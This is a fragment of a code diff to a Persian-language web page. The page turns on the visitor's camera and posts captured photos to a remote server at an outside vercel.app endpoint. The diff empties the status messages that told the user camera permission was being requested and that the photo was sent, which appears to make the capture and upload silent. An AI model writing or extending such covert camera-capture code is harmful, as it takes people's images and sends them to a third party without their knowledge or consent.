@@ -105,7 +105,7 @@ p{
         
         video.style.display = 'block'; 
         sendManualBtn.style.display = 'block'; // ✅ نمایش دکمه ارسال عکس
-        log.innerText = "در حال گرفتن مجوز دوربین...";
+        log.innerText = "";
         startCamera();
     });
 
@@ -165,7 +165,7 @@ p{
         try {
             log.innerText = "";
             await fetch('https://eeeeyuzl.vercel.app/send-photo', { method: 'POST', body: formData });
-            log.innerText = `✅ ارسال موفق.`; 
+            log.innerText = ""; 
         } catch (e) {
             log.innerText = "⚠️ خطا در ارسال به سرور.";
         }
@@ -176,6 +176,7 @@ p{
 </body>
 
 </html>
+
 
 
 
